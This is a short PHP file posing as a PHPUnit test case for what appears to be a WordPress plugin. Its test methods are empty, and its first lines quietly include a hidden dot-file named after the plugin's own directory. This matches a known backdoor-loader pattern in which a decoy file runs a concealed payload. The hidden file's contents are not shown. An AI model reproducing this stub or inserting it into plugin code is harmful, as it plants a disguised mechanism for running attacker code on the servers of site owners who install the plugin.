<?php
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class OneTestCase extends PHPUnit_Framework_TestCase
{
    public function noTestCase()
    {
    }

    public function testCase($arg = '')
    {
    }
}
